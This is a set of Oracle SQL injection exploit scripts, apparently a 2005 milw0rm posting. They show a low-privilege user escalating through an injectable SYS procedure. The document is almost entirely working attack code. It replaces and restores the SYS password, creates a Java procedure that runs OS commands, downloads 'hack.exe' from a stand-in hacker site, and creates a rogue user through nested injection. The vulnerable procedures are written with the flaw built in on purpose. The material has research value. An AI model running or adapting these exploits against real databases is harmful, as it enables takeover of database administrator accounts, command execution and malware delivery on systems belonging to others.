/*
Advanced SQL Injection in Oracle databases
Becoming the SYS user with SQL Injection.
This script creates functions that can be injected to replace
the password of the SYS user and to restore it to the original value.

By Esteban Martinez Fayo
secemf@gmail.com
*/
------------
-- Execute this as a low privilege user
------------

--This table is optional if you don't want to save the old SYS password
CREATE TABLE "SCOTT"."PSW_DATA" ("USERNAME" VARCHAR2(32 byte) NOT NULL,
"PSW_HASH" VARCHAR2(30 byte) NOT NULL);

CREATE OR REPLACE FUNCTION "SCOTT"."SQLI_CHANGEPSW" return varchar2
authid current_user as
pragma autonomous_transaction;
ROW_COUNT NUMERIC;
PSW VARCHAR2(30);
BEGIN
EXECUTE IMMEDIATE 'SELECT COUNT(*) FROM SCOTT.PSW_DATA' INTO ROW_COUNT;
IF (ROW_COUNT <= 0) THEN
EXECUTE IMMEDIATE 'INSERT INTO SCOTT.PSW_DATA select username,
password from dba_users where username=''SYS''';
EXECUTE IMMEDIATE 'ALTER USER SYS IDENTIFIED BY newpsw';
END IF;
COMMIT;
RETURN '';
END;
/

CREATE OR REPLACE FUNCTION "SCOTT"."SQLI_RESTOREPSW" return varchar2
authid current_user as
pragma autonomous_transaction;
PSW_HASH VARCHAR2(30);
BEGIN
EXECUTE IMMEDIATE 'SELECT PSW_HASH FROM SCOTT.PSW_DATA WHERE 
USERNAME = ''SYS''' INTO PSW_HASH;
EXECUTE IMMEDIATE 'ALTER USER SYS IDENTIFIED BY VALUES ''' || PSW_HASH || '''';
EXECUTE IMMEDIATE 'DELETE FROM SCOTT.PSW_DATA where username=''SYS''';
COMMIT;
RETURN '';
END;
/


-- SYS.SQLIVULN is a procedure vulnerable to SQL Injection. The vulnerability exists
-- in a single PL/SQL statement (not in an anonymous PL/SQL block).
-- See file SQLInjectionLimitation.sql
-- To change the SYS password execute:
EXEC SYS.SQLIVULN('MANAGER''||SCOTT.SQLI_CHANGEPSW()||''');

-- To restore the SYS password execute:
EXEC SYS.SQLIVULN('MANAGER''||SCOTT.SQLI_RESTOREPSW()||''');

--------------------------------------------------------------------------------------------------------

/*
Advanced SQL Injection in Oracle databases
Executing OS Command with SQL Injection

By Esteban Martinez Fayo
secemf@gmail.com
*/

CREATE OR REPLACE FUNCTION "SCOTT"."SQLI" return varchar2
authid current_user as
pragma autonomous_transaction;
SqlCommand VARCHAR2(2048);

BEGIN
SqlCommand := '
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "SRC_EXECUTEOS" AS
import java.lang.*;
import java.io.*;

public class ExecuteOS
{
public static void printFile (String fileName) throws IOException
{
File fileOut;
FileReader fileReaderOut;
BufferedReader buffReader;
String strRead;

fileOut = new File (fileName);
fileReaderOut = new FileReader (fileOut);
buffReader = new BufferedReader(fileReaderOut);
while ((strRead = buffReader.readLine()) != null)
System.out.println(strRead);
}

public static void execOSCmd (String cmd) throws IOException, java.lang.InterruptedException
{
String[] strCmd = {"cmd.exe", "/c", "1>c:\\stdout.txt", "2>c:\\stderr.txt", cmd};

System.out.println("==========\r\nExecuting OS command...");
Process p = Runtime.getRuntime().exec(strCmd);
p.waitFor();
System.out.println("\r\n==========\r\nThis was the STANDARD OUTPUT for the command:");
printFile ("c:\\stdout.txt");
System.out.println("\r\n==========\r\nThis was the ERROR OUTPUT for the command:");
printFile ("c:\\stderr.txt");
}
}';
execute immediate SqlCommand;

SqlCommand := '
CREATE OR REPLACE PROCEDURE "PROC_EXECUTEOS" (p_command varchar2)
AS LANGUAGE JAVA
NAME ''ExecuteOS.execOSCmd (java.lang.String)'';';
execute immediate SqlCommand;

execute immediate 'GRANT EXECUTE ON PROC_EXECUTEOS TO SCOTT';

commit; -- Must do a commit
return ''; -- Must return a value
END;
/

-- SYS.SQLIVULN is a procedure vulnerable to SQL Injection. The vulnerability exists
-- in a single PL/SQL statement (not in an anonymous PL/SQL block).
-- See file SQLInjectionLimitation.sql
EXEC SYS.SQLIVULN('MANAGER''||SCOTT.SQLI()||''');
/
SET SERVEROUTPUT ON
/
CALL dbms_java.set_output(1999);
/
EXEC sys.proc_executeos ('dir');

--------------------------------------------------------------------------------------------------------

/*
Advanced SQL Injection in Oracle databases

By Esteban Martinez Fayo
secemf@gmail.com
*/
------------
-- Execute this as a SYS
------------

-- SQLVULN is a procedure vulnerable to SQL Injection. The vulnerability exists
-- in a single PL/SQL statement (not in an anonymous PL/SQL block).
CREATE OR REPLACE PROCEDURE "SYS"."SQLIVULN" (P_JOB VARCHAR2)
AS
AVGSAL Numeric;
BEGIN
EXECUTE IMMEDIATE 'SELECT AVG(SAL) FROM SCOTT.EMP WHERE JOB = '''||P_JOB||'''' INTO AVGSAL;
DBMS_OUTPUT.PUT_LINE('Average salary for the job is: '||AVGSAL);
END;
/
GRANT EXECUTE ON "SYS"."SQLIVULN" TO "SCOTT"
/


------------
-- Execute this as a low privilege user
------------
CREATE OR REPLACE FUNCTION "SCOTT"."SQLI" return varchar2
authid current_user as
BEGIN
execute immediate 'INSERT INTO SYS.PPT (PPC) VALUES (''55'')';
commit;
return '';
END;
/

--To exploit
EXEC SYS.SQLIVULN('MANAGER'' || SCOTT.SQLI() || ''');
-- This gives an Oracle Error

--------------------------------------------------------------------------------------------------------

/*
Advanced SQL Injection in Oracle databases
Uploading a file with SQL Injection
SYS.SQLIVULN is a procedure vulnerable to SQL Injection

By Esteban Martinez Fayo
secemf@gmail.com
*/

CREATE OR REPLACE FUNCTION "SCOTT"."SQLI" return varchar2
authid current_user as
pragma autonomous_transaction;
SqlCommand VARCHAR2(2048);

BEGIN
SqlCommand := '
CREATE OR REPLACE JAVA SOURCE NAMED "SRC_FILE_UPLOAD" AS
import java.lang.*;
import java.io.*;

public class FileUpload {
public static void fileUpload(String myFile, String url) throws Exception
{
File binaryFile = new File(myFile);
FileOutputStream outStream = new FileOutputStream(binaryFile);
java.net.URL u = new java.net.URL(url);
java.net.URLConnection uc = u.openConnection();
InputStream is = (InputStream)uc.getInputStream();
BufferedReader in = new BufferedReader (new InputStreamReader (is));
byte buffer[] = new byte[1024];
int length = -1;
while ((length = is.read(buffer)) != -1) {
outStream.write(buffer, 0, length);
outStream.flush(); }
is.close(); outStream.close();
} };';
execute immediate SqlCommand;

SqlCommand := '
CREATE OR REPLACE PROCEDURE "PROC_FILEUPLOAD" (p_file varchar2, p_url varchar2)
AS LANGUAGE JAVA
NAME ''FileUpload.fileUpload (java.lang.String, java.lang.String)'';';
execute immediate SqlCommand;

execute immediate 'GRANT EXECUTE ON PROC_FILEUPLOAD TO SCOTT';

commit; -- Must do a commit
return ''; -- Must return a value
END;
/

SET SERVEROUTPUT ON
/
CALL dbms_java.set_output(1999);
/
-- SYS.SQLIVULN is a procedure vulnerable to SQL Injection. 
-- The vulnerability exists
-- in a single PL/SQL statement (not in an anonymous PL/SQL block).
-- See file SQLInjectionLimitation.sql
EXEC SYS.SQLIVULN('MANAGER''||SCOTT.SQLI()||''');
/

-- Call the procedure created in the SQL Injection
EXEC sys.proc_fileupload ('c:\hack.exe', 'http://hackersite/hack.exe');

--------------------------------------------------------------------------------------------------------

/*
Advanced SQL Injection in Oracle databases
Example of a function derfined with authid current_user
vulnerable to SQL Injection in a PL/SQL anonymous block.

By Esteban Martinez Fayo
secemf@gmail.com
*/

------------
-- Execute this as a SYS or any other user that can create functions
------------

-- SQLIVULN_CUR_USR is a function vulnerable to SQL Injection in a PL/SQL anonymous
-- block that executes with the privilege of the caller (defined with AUTHID CURRENT_USER).
CREATE OR REPLACE FUNCTION "SYS"."SQLIVULN_CUR_USR" (P_JOB VARCHAR2)
return VARCHAR2
authid current_user as
AVGSAL Numeric;
BEGIN
EXECUTE IMMEDIATE 'BEGIN SELECT AVG(SAL) INTO :AVGSAL FROM SCOTT.EMP
WHERE JOB = '''||P_JOB||'''; END;' USING OUT AVGSAL;
return '';
END;
/


GRANT EXECUTE ON "SYS"."SQLIVULN_CUR_USR" TO "SCOTT"
/


-- SYS.SQLIVULN is a procedure vulnerable to SQL Injection. The vulnerability exists
-- in a single PL/SQL statement (not in an anonymous PL/SQL block).
-- See file SQLInjectionLimitation.sql
-- To Exploit the attacker could execute:
EXEC SYS.SQLIVULN('MANAGER''||SYS.SQLIVULN_CUR_USR(''AA''''; execute immediate
''''declare pragma autonomous_transaction; begin execute immediate ''''''''create
user eric identified by newpsw''''''''; commit; end;''''; end;--'')||''');

-- milw0rm.com [2005-04-13]
